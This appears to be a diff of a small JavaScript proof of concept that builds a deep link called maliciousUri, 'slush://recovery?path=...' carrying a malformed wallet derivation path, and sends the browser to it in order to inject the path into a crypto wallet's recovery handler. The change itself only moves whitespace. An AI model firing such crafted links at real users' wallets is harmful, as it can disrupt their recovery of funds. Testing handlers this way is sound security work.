@@ -26,15 +26,15 @@
     function injectCorruptPath() {
         const log = document.getElementById('log');
         
-    
-        const corruptPath = "m/44'/60'/0'/0/invalid_index_999";
-        
       
+        const corruptPath = "m/44'/60'/0'/0/invalid_index_999"; 
+        
+
         const maliciousUri = `slush://recovery?path=${encodeURIComponent(corruptPath)}`;
 
         log.innerHTML = `> Mencoba menyuntikkan:<br>${corruptPath}`;
         
-      
+    
         window.location.href = maliciousUri;
 
         setTimeout(() => {
